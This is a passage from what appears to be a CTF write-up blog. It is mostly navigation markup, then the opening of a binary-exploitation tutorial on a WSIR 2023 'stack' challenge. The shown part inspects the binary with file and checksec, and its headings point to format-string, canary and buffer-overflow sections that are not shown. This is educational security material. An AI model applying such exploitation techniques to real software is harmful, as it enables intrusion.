            <span class="md-nav__icon md-icon"></span>
            hardware
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/hardware/hm74/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    hm74
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1_5">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1_5" id="__nav_5_2_1_1_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    forensics
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_1_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1_5">
            <span class="md-nav__icon md-icon"></span>
            forensics
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/forensics/packet_cyclone/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    packet cyclone
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_2" id="__nav_5_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2024
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2">
            <span class="md-nav__icon md-icon"></span>
            2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTF/writeups/2024/Snapp-ctf-2024/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Snapp CTF 2024
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5_2_2_1" id="__nav_5_2_2_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            Snapp CTF 2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_2" id="__nav_5_2_2_1_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_2">
            <span class="md-nav__icon md-icon"></span>
            crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/crypto/Cryptos/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cryptos
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/crypto/Bombastic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bombastic
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/crypto/Blex/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blex
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/crypto/Grail/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Grail
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_3">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_3" id="__nav_5_2_2_1_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_3">
            <span class="md-nav__icon md-icon"></span>
            pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_admin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp admin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/pwn/snapp_shell/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp shell
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_4">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_4" id="__nav_5_2_2_1_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    rev
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_4">
            <span class="md-nav__icon md-icon"></span>
            rev
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/rev/visits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Visits
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/rev/turnob/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TurnOB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/rev/blink/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blink
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_5">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_5" id="__nav_5_2_2_1_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_5">
            <span class="md-nav__icon md-icon"></span>
            web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/web/snapp_cat/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp cat
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/web/snapp_fal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp fal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/web/welcome/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    welcome
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_6">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_6" id="__nav_5_2_2_1_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    forensics
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_6">
            <span class="md-nav__icon md-icon"></span>
            forensics
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/forensics/snapp_report/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp Report
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_1_7">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_1_7" id="__nav_5_2_2_1_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    osint
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_1_7">
            <span class="md-nav__icon md-icon"></span>
            osint
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_records/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp Records
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_bounties/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp Bounties
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_customers/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp Customers
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Snapp-ctf-2024/osint/snapp_saving/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Snapp Saving
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_2" id="__nav_5_2_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cyber Apocalypse 2024
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            Cyber Apocalypse 2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_2_1">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_2_1" id="__nav_5_2_2_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Permuted
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_2_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_2_2" id="__nav_5_2_2_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    blockchain
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            blockchain
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lucky Facucet
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Russian Roulette
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/ledgerheist/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Ledger Heist
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2_3">
        
          
          <label class="md-nav__link" for="__nav_5_2_2_3" id="__nav_5_2_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Just CTF 2024
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_2_3">
            <span class="md-nav__icon md-icon"></span>
            Just CTF 2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2024/JustCTF2024/blockchain/blockchains/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    blockchain
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3">
        
          
          <label class="md-nav__link" for="__nav_5_2_3" id="__nav_5_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2025
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3">
            <span class="md-nav__icon md-icon"></span>
            2025
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3_1">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTF/writeups/2025/Cyber-Apocalypse-2025/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Cyber Apocalypse 2025
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5_2_3_1" id="__nav_5_2_3_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3_1">
            <span class="md-nav__icon md-icon"></span>
            Cyber Apocalypse 2025
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3_1_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_3_1_2" id="__nav_5_2_3_1_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Twin Oracle
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3_2">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Iran Tech Olympics CTF 2025
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5_2_3_2" id="__nav_5_2_3_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3_2">
            <span class="md-nav__icon md-icon"></span>
            Iran Tech Olympics CTF 2025
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3_2_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_3_2_2" id="__nav_5_2_3_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_3_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3_2_2">
            <span class="md-nav__icon md-icon"></span>
            crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Techras
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Techras II
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Gotam
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_3_2_3">
        
          
          <label class="md-nav__link" for="__nav_5_2_3_2_3" id="__nav_5_2_3_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_3_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_3_2_3">
            <span class="md-nav__icon md-icon"></span>
            web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Idolatress I
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Idolatress II
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Contact-Us/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Contact Us
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../About-Us/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    About Us
    
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#analysing-the-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Analysing the binary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#format-string" class="md-nav__link">
    <span class="md-ellipsis">
      Format String
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#assembly-is-fun" class="md-nav__link">
    <span class="md-ellipsis">
      Assembly is fun
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploiting" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#canary" class="md-nav__link">
    <span class="md-ellipsis">
      Canary üê¶
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#the-bof-xd" class="md-nav__link">
    <span class="md-ellipsis">
      THE BOF xD
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authors" class="md-nav__link">
    <span class="md-ellipsis">
      Authors
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<p>About a month ago the WSIR 2023 national level was held and I was one of the competition designers and judges.</p>
<p>Now, the blog wouldn't be good enough without at least one post about binary exploiting so here it is.</p>
<p>This challenge is easy-medium and as I write this post I'll solve it at the same time. I'll try to explain my thought process as I go along, treating it as a black box (without having read the actual source code) (It's been a while so it'll be ok I guess).</p>
<h2 id="analysing-the-binary">Analysing the binary</h2>
<p>Well as anything else first we should analyse to see what we are dealing with, let's see.
</p><div class="language-bash highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
<span class="normal"><a href="#__codelineno-0-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>$<span class="w"> </span>file<span class="w"> </span>stack<span class="w">                                                                                                                                                                                                                              </span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>stack:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>dynamically<span class="w"> </span>linked,<span class="w"> </span>interpreter<span class="w"> </span>/lib64/ld-linux-x86-64.so.2,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>02dabf21c7908bf871d7a7144df54471ff8d3fb1,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">3</span>.2.0,<span class="w"> </span>not<span class="w"> </span>stripped
</span></code></pre></div></td></tr></tbody></table></div>
Well the first good news is that the binary is dynamically linked. How about it's mitigations?
<div class="language-bash highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
<span class="normal"><a href="#__codelineno-1-2">2</a></span>
<span class="normal"><a href="#__codelineno-1-3">3</a></span>
<span class="normal"><a href="#__codelineno-1-4">4</a></span>
<span class="normal"><a href="#__codelineno-1-5">5</a></span>
<span class="normal"><a href="#__codelineno-1-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>stack
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
</span></code></pre></div></td></tr></tbody></table></div>
(I'll write a post about what are these and other basics of binary exploiting later and put the link here so this would be useful for everyone üòÑ )<p></p>
<p>well at least the PIE is not enable which mean that the virtual address of codes and objects will be static and will not change each time we run the program. Further I'll explain why is it useful.</p>
<div class="language-text highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
<span class="normal"><a href="#__codelineno-2-2">2</a></span>
<span class="normal"><a href="#__codelineno-2-3">3</a></span>
<span class="normal"><a href="#__codelineno-2-4">4</a></span>
<span class="normal"><a href="#__codelineno-2-5">5</a></span>
<span class="normal"><a href="#__codelineno-2-6">6</a></span>
<span class="normal"><a href="#__codelineno-2-7">7</a></span>
